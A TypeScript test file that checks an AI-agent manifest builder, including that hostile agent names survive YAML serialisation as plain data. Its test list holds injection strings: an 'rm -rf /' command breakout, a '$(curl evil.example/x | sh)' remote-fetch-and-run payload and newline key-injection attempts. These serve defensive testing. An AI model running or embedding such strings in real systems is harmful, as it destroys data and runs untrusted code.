import { describe, it, expect } from 'vitest';
import { parse as parseYaml } from 'yaml';
import { AgentManifest } from '@devdigest/shared';
import {
  buildAgentManifest,
  renderAgentManifestYaml,
  agentManifestFile,
  type ManifestSourceAgent,
} from './manifest.js';
import { ValidationError } from '../../platform/errors.js';
import { agentManifestPath } from './constants.js';

/**
 * specs/14-export-to-ci.md (P2, security-critical) — `buildAgentManifest`
 * validates against the SAME `AgentManifest` contract the agent-runner
 * re-validates on the other end (AC-12); `renderAgentManifestYaml` uses the
 * `yaml` package, never hand-rolled quoting, so a hostile agent name can
 * never break out of its surrounding YAML structure (AC-16).
 */

function baseAgent(overrides: Partial<ManifestSourceAgent> = {}): ManifestSourceAgent {
  return {
    name: 'Security Reviewer',
    provider: 'openai',
    model: 'gpt-4.1',
    systemPrompt: 'Review the diff for security issues.',
    skillSlugs: ['no-secrets', 'style-guide'],
    strategy: 'auto',
    ciFailOn: 'critical',
    ...overrides,
  };
}

describe('buildAgentManifest', () => {
  it('AC-12 — the built manifest validates against the shared AgentManifest zod contract', () => {
    const manifest = buildAgentManifest(baseAgent());
    const result = AgentManifest.safeParse(manifest);
    expect(result.success).toBe(true);
  });

  it('round-trips name/provider/model/system-prompt/skills/strategy/gate-policy through YAML unchanged', () => {
    const agent = baseAgent({
      name: 'Perf Reviewer',
      provider: 'anthropic',
      model: 'claude-opus-4',
      systemPrompt: 'Focus on N+1 queries and unnecessary re-renders.',
      skillSlugs: ['perf-basics'],
      strategy: 'map-reduce',
      ciFailOn: 'warning',
    });
    const yaml = renderAgentManifestYaml(buildAgentManifest(agent));
    const parsed = AgentManifest.parse(parseYaml(yaml));

    expect(parsed.name).toBe('Perf Reviewer');
    expect(parsed.provider).toBe('anthropic');
    expect(parsed.model).toBe('claude-opus-4');
    expect(parsed.system_prompt).toBe('Focus on N+1 queries and unnecessary re-renders.');
    expect(parsed.skills).toEqual(['perf-basics']);
    expect(parsed.strategy).toBe('map-reduce');
    expect(parsed.ci_fail_on).toBe('warning');
  });

  it('normalizes zero skills to an empty array, never a missing/null key', () => {
    const yaml = renderAgentManifestYaml(buildAgentManifest(baseAgent({ skillSlugs: [] })));
    const parsed = AgentManifest.parse(parseYaml(yaml));
    expect(parsed.skills).toEqual([]);
  });

  it('rejects a candidate that fails the shared contract before it can ever be serialised', () => {
    // An empty name fails `AgentManifest`'s `z.string().min(1)`.
    expect(() => buildAgentManifest(baseAgent({ name: '' }))).toThrow(ValidationError);
  });

  describe('AC-16 — a hostile agent name round-trips intact as DATA, never as executable/structural content', () => {
    const HOSTILE_NAMES = [
      '"; rm -rf / #',
      'Reviewer\nci_fail_on: never',
      '$(curl evil.example/x | sh)',
      'Name: with, "quotes" and: colons',
      'Reviewer\r\nname: injected-second-name',
    ];

    it.each(HOSTILE_NAMES)('round-trips %j byte-for-byte through YAML with no structural corruption', (hostileName) => {
      const manifest = buildAgentManifest(baseAgent({ name: hostileName }));
      const yaml = renderAgentManifestYaml(manifest);
      const parsedRaw = parseYaml(yaml);

      // Exactly the expected top-level keys — a newline/colon in the name
      // could not smuggle in a NEW top-level key or overwrite a sibling one.
      expect(Object.keys(parsedRaw).sort()).toEqual(
        ['ci_fail_on', 'model', 'name', 'provider', 'skills', 'strategy', 'system_prompt'].sort(),
      );
      expect(parsedRaw.name).toBe(hostileName);
      // The gate policy is untouched by a hostile name attempting to inject
      // a sibling key (e.g. `\nci_fail_on: never`).
      expect(parsedRaw.ci_fail_on).toBe('critical');

      const parsed = AgentManifest.parse(parsedRaw);
      expect(parsed.name).toBe(hostileName);
    });
  });
});

describe('agentManifestFile', () => {
  it('writes the manifest to the fixed, non-agent-authored slug path — never derived from the agent name', () => {
    const file = agentManifestFile(baseAgent({ name: '"; rm -rf / #' }));
    expect(file.path).toBe(agentManifestPath());
    expect(file.path).not.toContain('rm -rf');
    // The hostile name still reaches the FILE CONTENTS intact (AC-12).
    expect(file.contents).toContain('rm -rf');
  });
});
